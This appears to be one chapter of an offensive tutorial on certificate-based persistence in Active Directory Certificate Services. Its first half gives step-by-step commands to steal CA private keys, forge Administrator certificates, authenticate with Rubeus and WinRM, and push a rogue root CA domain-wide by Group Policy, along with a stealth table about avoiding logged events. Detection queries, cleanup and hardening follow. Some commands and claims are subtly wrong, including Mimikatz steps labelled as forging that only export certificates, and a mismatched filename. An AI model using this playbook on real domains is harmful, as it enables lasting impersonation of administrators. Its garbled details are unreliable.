# Certificate-Based Persistence

## Overview

Active Directory Certificate Services (AD CS) provides a Public Key Infrastructure (PKI) for the domain. Certificates issued by a domain CA are **trusted by all domain-joined machines and services**. An attacker who compromises AD CS or extracts CA private keys can:

1. **Forge certificates** for any user (including domain admin)
2. **Generate trusted HTTPS certificates** for any server
3. **Create certificate-based backdoors** that work indefinitely
4. **Bypass Kerberos and NTLM** entirely by authenticating with certificates

**Key Advantage:** Certificates you forge are trusted by **every machine** in the domain until the root CA certificate is rotated — which is rare. Smartcard logon certificates can be used for interactive authentication without any password.

---

## Prerequisites

- **CA Admin** or **Enterprise Admin** privileges (to issue/approve certificates or extract CA keys)
- Access to the CA server or CA backup files
- Tools: Certify, Mimikatz, OpenSSL, SharpDPAPI, ForgeCert, `certipy`

---

## Step 1: Enumerate the CA

### Using Certify

```cmd
Certify.exe find
```

This shows:
- CA server name
- CA certificate
- Enabled certificate templates
- Published templates
- ESC1, ESC2, ESC3, ESC8 vulnerabilities

### Using certutil (native)

```cmd
certutil -config - -ping
certutil -catemplates
certutil -CA -cainfo
```

### Using certipy (Linux)

```bash
certipy list -u Administrator@targetdomain.local -p 'Pass123!' -dc-ip 192.168.1.10
```

---

## Step 2: Extract the CA Private Key

### Method A: Extract from CA Server (Mimikatz)

```cmd
mimikatz.exe privilege::debug
crypto::certificates /systemstore:local_machine /export
```

This exports certificates from the CA's local machine store including private keys. Look for:
- Subject: `CN=<CA-NAME>, DC=targetdomain, DC=local`
- Key export includes the private key (`.pvk`)

### Method B: Extract CA Backup

CA private keys are often stored in:
- `C:\Windows\System32\CertSrv\CertEnroll\*.p12` (backup)
- `%SystemRoot%\System32\CertLog\*.p12`
- NTDS database (if CA is integrated)

```cmd
# Check for CA backup files
dir C:\Windows\System32\CertSrv\CertEnroll\*.p12
```

### Method C: DPAPI Backup Key Extraction

```cmd
mimikatz.exe privilege::debug
dpapi::capi /export
```

### Method D: Using SharpDPAPI

```cmd
SharpDPAPI.exe certificates /machine
```

### Method E: Extract CA Key via certipy (Linux)

```bash
# Extract CA's private key via ESC1 or ESC8
certipy ca -ca '<CA-NAME>' -backup -u Administrator@targetdomain.local -p 'Pass123!' -dc-ip 192.168.1.10
```

---

## Step 3: Forge Certificates

### Using Mimikatz

**Export all certificates including private keys from the machine store:**

```cmd
crypto::certificates /systemstore:local_machine /export
```

**Use the CA private key to sign a forged certificate via PFX:**

```cmd
crypto::certificates /export /systemstore:local_machine /store:MY /pem
```

### Using OpenSSL (after extracting CA key)

```bash
# Convert CA cert and key to PEM
openssl pkcs12 -in exported_ca.p12 -out ca.pem -nodes

# Generate a new key and CSR for the target user
openssl genrsa -out forged.key 2048
openssl req -new -key forged.key -out forged.csr -subj "/CN=Administrator/OU=Users/DC=targetdomain/DC=local"

# Sign with the CA key and certificate
openssl x509 -req -in forged.csr -CA ca.pem -CAkey ca.pem -CAcreateserial -out forged.crt -days 3650 -extensions usr_cert

# Convert to PFX for Windows
openssl pkcs12 -export -out forged.pfx -inkey forged.key -in forged.cert -certfile ca.pem
```

### Using ForgeCert (.NET Tool)

```cmd
ForgeCert.exe --CaCertPath CA.pfx --CaCertPassword Password123 --Subject "CN=Administrator" --SubjectAltName "administrator@targetdomain.local" --PfxPath forged_admin.pfx --PfxPassword ForgedPass
```

### Using certipy (Linux)

```bash
# Request certificate for any user (ESC1 vulnerability)
certipy req -u targetdomain.local/Administrator -p 'Pass123!' -ca '<CA-NAME>' -target CA-SERVER -template ESC1-Template

# Forge a certificate with the CA key
certipy forge -ca-pfx CA.pfx -upn Administrator@targetdomain.local -subject "CN=Administrator"
```

---

## Step 4: Install and Use the Forged Certificate

### Install the Certificate

```cmd
certutil -user -importpfx forged_admin.pfx NoExport
```

Or via PowerShell:

```powershell
Import-PfxCertificate -FilePath forged_admin.pfx -CertStoreLocation Cert:\CurrentUser\My -Password (ConvertTo-SecureString "ForgedPass" -AsPlainText -Force)
```

### Authenticate with the Certificate

**Kerberos PKINIT authentication (certificate → TGT):**

```cmd
# Use the certificate to request a TGT
mimikatz.exe "kerberos::certificates /export" "exit"

# Then use the PFX for PKINIT
Rubeus.exe asktgt /user:Administrator /certificate:forged_admin.pfx /password:ForgedPass /ptt
```

```cmd
Rubeus.exe asktgt /user:Administrator /certificate:forged_admin.pfx /password:ForgedPass /domain:targetdomain.local /dc:DC01.targetdomain.local /ptt
```

**Smartcard logon (physical / RDP):**

1. Open `certmgr.msc`
2. Import the forged PFX into Personal store
3. Use for smartcard logon sessions

**WinRM with Certificate:**

```powershell
$cert = Get-ChildItem -Path Cert:\CurrentUser\My | Where-Object { $_.Subject -like "*Administrator*" }
Enter-PSSession -ComputerName DC01 -CertificateThumbprint $cert.Thumbprint
```

---

## Step 5: Alternative — Root CA Trust Backdoor

Install a **rogue root CA certificate** on a Domain Controller so that any cert signed by your rogue CA is trusted by the domain:

```cmd
certutil -addstore Root rogue_ca.cer
certutil -addstore CA rogue_ca.cer
```

Via Group Policy (persistent across the domain):

```powershell
$gpo = New-GPO -Name "Rogue CA Trust"
Set-GPPrefRegistryValue -Name "Rogue CA Trust" -Context Computer -Action Create -Key "HKLM\SOFTWARE\Microsoft\EnterpriseCertificates\Root\Certificates\THUMBPRINT" -ValueName "Blob" -Value "<raw cert data>" -Type Binary
New-GPLink -Name "Rogue CA Trust" -Target "DC=targetdomain,DC=local"
```

---

## OPSEC / Stealth Considerations

| Factor | Consideration |
|--------|---------------|
| **CA Key Extraction** | Extracting the CA private key generates event 4662 (Directory Service Access) if via DCSync, or no event if done locally from the CA. |
| **Forged Certificate Lifetime** | Default is 1 year. Long-lived certs (10 years) are suspicious. |
| **Certificate Template** | Forged certs may not match any published template — anomaly detection exists. |
| **CA Backup** | CA backup events (4886-4899) are logged. |
| **Certificate Logging** | Event 4886 (Certificate Services received a certificate request) and 4887 (Certificate Services approved a request) are logged on the CA. |
| **PKINIT** | Using a certificate for Kerberos PKINIT generates event 4768 with `CertIssuerName` and `CertSerialNumber` — easily traceable. |

---

## Detection

### Event Logs to Monitor

| Event ID | Description | Where |
|----------|-------------|-------|
| **4886** | Certificate Services received a certificate request | CA Security Log |
| **4887** | Certificate Services approved a certificate request | CA Security Log |
| **4888** | Certificate Services denied a certificate request | CA Security Log |
| **4889** | Certificate Services queued a certificate request | CA Security Log |
| **4890** | Certificate Services manager set a new template | CA Security Log |
| **4898** | Certificate Services loaded a template | CA Security Log |
| **4662** | Directory Service Access (CA key access) | CA / DC Security Log |
| **4768** | TGT request with PKINIT `CertIssuerName` attribute | DC Security Log |

### Detection Indicators

1. **Unknown certificate issued** — Event 4887 with a template not requested by any known process
2. **Suspicious PKINIT requests** — Event 4768 with `CertIssuerName` not matching the internal CA's name
3. **Anomalous certificate serial number** — Forged certs may have serial numbers outside the CA's normal range
4. **Certificate template abuse** — Using templates marked for "Domain Controller Authentication" or "Administrator"
5. **CA key export** — Event 4662 with GUID `91d67418-0132-4acc-8d79-c08e857cfbec` (CA private key export right)

### Detection Queries

**KQL — Suspicious Certificate Issuance:**

```
SecurityEvent
| where EventID == 4887
| extend RequestAttributes = parse_json(EventData)
| where RequestAttributes.Subject contains "CN=Administrator" or RequestAttributes.Subject contains "CN=Domain Controller"
```

**KQL — PKINIT TGT with Forged Certificate:**

```
SecurityEvent
| where EventID == 4768
| where TicketOptions contains "certificate" or CertIssuerName !contains "CA-NAME"
```

### Forensic Analysis

- Examine all issued certificates from the CA (event logs and CA database)
- Compare the CA database against the actual certificate templates
- Look for certificates with extended lifetimes (>2 years)
- Check for root CA certificates added to the `NTAuth` store

---

## Cleanup / Reversal

### Revoke the Forged Certificate

On the CA:

```cmd
certutil -revoke <serial_number> 1
```

Where `1` = CRL_REASON_AFFILIATION_CHANGED.

```cmd
# Issue new CRL (Certificate Revocation List)
certutil -crl
```

### Remove Rogue Root CA

```cmd
certutil -delstore Root "Rogue CA Name"
certutil -delstore CA "Rogue CA Name"
```

### Rotate the CA Private Key (if extracted)

If the CA private key was compromised, it must be replaced:

```cmd
# Backup current CA configuration
certutil -backup C:\CA_Backup

# Renew the CA certificate with a new key pair
certutil -renewCert ReuseKeys:False

# Or reinstall the CA role (complete reconfiguration)
# Export and reissue all valid certificates
```

### Verify Cleanup

```cmd
certutil -view
certutil -viewlog
```

Ensure no revoked certificates are still being used.

### Post-Cleanup

- **Rotate the KRBTGT password twice** (compromised CA key can forge Kerberos certs)
- **Change all machine passwords** (if machine certificates were forged)
- **Enable CA auditing** (audit CA service events)
- **Review certificate templates** for dangerous configurations (ESC1-ESC8)
- **Review the NTAuthCertificates object** in AD for unauthorized CAs
- **Monitor for 4887 events** going forward with alerting

---

## Defenses Against Certificate Backdoors

### Harden AD CS

1. **Disable dangerous templates** — Remove or configure templates that allow:
   - Requesters to specify subject alternative names (SAN)
   - Any user to enroll
   - Domain Controller Authentication templates
2. **Enable CA key archiving** — Allows recovery and auditing of issued keys
3. **Set CA certificate validity to shorter periods** (3-5 years max)
4. **Enable key-based renewal** (KRA) — Prevent renewal without private key

### Monitoring

1. **Alert on 4887** — Any certificate issued to a privileged user/group
2. **Alert on PKINIT requests** — Event 4768 for administrator accounts using certificate auth
3. **Monitor the NTAuth store** — Only the internal CA should be present
4. **Regularly validate CRL** — Ensure all machines check the CRL for revoked certificates

### Certificate Template Hardening

Review each template for:
- **Require Manager Approval** — Yes
- **This number of authorized signatures** — 2 (dual approval)
- **Supply in the request** — Disabled for subject and SAN
- **Key Usage** — Limit to specific scenarios

---

## References

- [Certify](https://github.com/GhostPack/Certify)
- [ForgeCert](https://github.com/TheWover/ForgeCert)
- [SpecterOps — Certified Pre-Owned (AD CS abuse)](https://posts.specterops.io/certified-pre-owned-d9592d1d1e3c)
- [CA/Browser Forum Baseline Requirements](https://cabforum.org/baseline-requirements-documents/)
- MITRE ATT&CK: T1587.003 (Develop Capabilities: Digital Certificates)
- MITRE ATT&CK: T1649 (Steal or Forge Authentication Certificates)

---

**Next:** [09 - Group Policy Persistence](09_Group_Policy_Persistence.md)
